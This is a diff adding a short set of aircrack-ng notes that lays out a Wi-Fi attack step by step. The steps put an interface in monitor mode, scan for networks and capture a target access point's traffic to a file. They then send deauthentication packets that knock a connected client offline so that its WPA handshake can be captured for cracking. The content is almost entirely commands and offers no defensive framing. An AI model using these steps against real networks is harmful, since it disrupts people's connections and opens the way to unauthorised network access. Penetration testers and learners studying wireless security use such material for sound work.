@@ -1,0 +1,10 @@
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+airodump-ng -c <channel> --bssid <BSSID> -w <output_file> wlan0mon
+
+#deauth
+In the output from airodump-ng, look at the Station section. This shows the MAC addresses of devices connected to the target network.
+
+Use aireplay-ng to send deauthentication packets to a connected client, forcing it to reconnect and thus triggering a handshake.
+aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> wlan0mon
